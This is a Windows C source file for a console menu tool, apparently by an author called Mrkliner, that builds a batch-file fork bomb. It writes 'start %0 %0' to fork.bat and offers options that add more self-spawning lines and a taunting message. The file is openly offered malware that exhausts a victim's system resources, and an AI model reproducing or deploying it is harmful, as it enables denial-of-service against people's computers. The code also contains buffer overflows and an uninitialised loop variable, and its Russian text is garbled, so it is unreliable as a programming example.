#include <stdio.h>
#include <math.h>
#include <time.h>
#include <windows.h>
#include <crt.h>
#include <string.h>
#include <conio.h>
#include <stdlib.h>
char key;
char command[] = "start %0 %0";
int main()
{
    RECT r;
    /*UINT i = GetConsoleCP();
    printf ("%d\n", i);
    UINT j = GetConsoleCP();
    printf ("%d\n", j);*/
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    HWND hwndConsole = GetConsoleWindow();
    SetWindowText(hwndConsole, "���� ��� �������� ������ - \"Fork Bomb\" �� Mrkliner");
    GetWindowRect(hwndConsole, &r);
    MoveWindow(hwndConsole, 1, 1, 800, 480, TRUE);
    //SendMessage(hwndConsole, WM_HSCROLL, NULL, NULL);
    while (1)
    {
        setlocale(0, "rus");
        GetWindowRect(hwndConsole, &r);
        int width = r.right - r.left;
        int height = r.bottom - r.top;
        if (width >= 801)
        {
            MoveWindow(hwndConsole, 1, 1, 800, 480, TRUE);
        }
        if (height >= 481)
        {
            MoveWindow(hwndConsole, 1, 1, 800, 480, TRUE);
        }
        SetConsoleTextAttribute (hConsole, 11);
        gotoxy (28, 2);
        printf ("1 - ������� ���� �����\n");
        gotoxy (28, 4);
        printf ("2 - ����� �� ���������\n");
        gotoxy (28, 6);
        printf ("3 - ��������� fork �����\n");
        gotoxy (28, 8);
        printf ("4 - ���������� � �����");
        gotoxy (28, 10);
        printf ("5 - ��� fork �����");
        gotoxy (0, 23);
        printf (">>");
        key = getch ();
        if (key == '1')
        {
            FILE *p;
            p=fopen("fork.bat","w");
            fprintf(p, "%s", command);
            fclose(p);
            char text[] = "���� Fork ����� ������� �������!\nŸ ��� �� bat:\n\n";
            strcat(text, command);
            MessageBoxA(NULL, text, "����� � ��������", MB_ICONINFORMATION | MB_OK);
            fclose(p);
        }
        else if (key == '4')
        {
            SetConsoleTextAttribute (hConsole, 14);
            system ("cls");
            printf ("���� ���� ������������ ��� ������������� � ����� ��������, � �� �������� ���-\n���� ��� �����!\n\n");
            printf("� ����� ����� ����:\n\n");
            SetConsoleCP(1251);
            SetConsoleOutputCP(1251);
            printf (" \t%c", 249);
            SetConsoleCP(866);
            SetConsoleOutputCP(866);
            setlocale(0, "rus");
            printf (" ������� � �������� ����\n");
            SetConsoleCP(1251);
            SetConsoleOutputCP(1251);
            printf (" \t%c", 249);
            SetConsoleCP(866);
            SetConsoleOutputCP(866);
            setlocale (0, "rus");
            printf (" ����������� ������������ fork-�����\n");
            SetConsoleCP(1251);
            SetConsoleOutputCP(1251);
            printf (" \t%c", 249);
            SetConsoleCP(866);
            SetConsoleOutputCP(866);
            setlocale (0, "rus");
            printf (" �������� bat ������� ������� �������� �� XP �� 11 � ����\n\n");
            printf ("���� ��������� �������: ");
            SetConsoleTextAttribute (hConsole, 11);
            printf("mrkliner.github.io\n");
            printf ("                        ");
            SetConsoleCP(1251);
            SetConsoleOutputCP(1251);
            for (int i; i < 18; i++)
                printf("%c", 205);
            printf ("\n\n\n");
            SetConsoleCP(866);
            SetConsoleOutputCP(866);
            setlocale (0, "rus");
            SetConsoleTextAttribute(hConsole, 14);
            printf("��� ���� �� ����� �����������!\n��� �������� � ���� ������� ����� �������...");
            getch();
            system ("cls");
        }
        else if (key == '5')
        {
            system ("cls");
            char link[] = "";
            printf ("������� ���� � ����� ��� ��� �����: ");
            scanf ("%s", &link);
            FILE *bomb;
            bomb=fopen(link, "rt");
            char sod[] = "", probel;
            printf ("��� ������:\n\n");
            SetConsoleTextAttribute (hConsole, 10);
            if (bomb) {
                while (fscanf(bomb, "%s%c", sod, &probel)!=EOF)

                    printf("%s%c",sod, probel);

            }
            SetConsoleTextAttribute (hConsole, 11);
            printf ("\n\n");
            printf ("������� ����� ������� ��� �������� � ����...");
            getch();
            fclose (bomb);
            system ("cls");

        }
        else if (key == '2')
        {
            break;
            exit(0);
            return 0;
        }
        else if (key == '3')
        {
            system ("cls");
            printf ("\n\t\t\t1 - �������� �������� � 1 �����������\n\n\t\t\t2 - �������� ������� - \"�� �����\"\n\n\t\t\t3 - �������� ���������\n\n\t\t\t4 - �������� ��� ���� \"����� ��� ������\"\n\n\t\t\t5 - �������� ������ ������\n");
            gotoxy (0, 23);
            printf (">>");
            key = getch();
            system ("cls");
            if (key == '1')
                strcat (command, "\ntimeout 1");
            else if (key == '2')
                strcat (command, "\necho You are an idiot! �� �����!");
            else if (key == '3')
            {
                strcpy (command, "start %0 %0");
            }
            else if (key == '4')
            {
                strcat (command, "\ntitle ����� ��� ������ 1.0 Build 1");
            }
            else if (key == '5')
            {
                strcat (command, "\ncolor A");
                strcat (command, "\ndir /s");
                strcat (command, "\nstart %0 %0");
                strcat (command, "\nstart %0 %0");
                strcat (command, "\nstart %0 %0");
            }
        }
    }
    return 0;
}
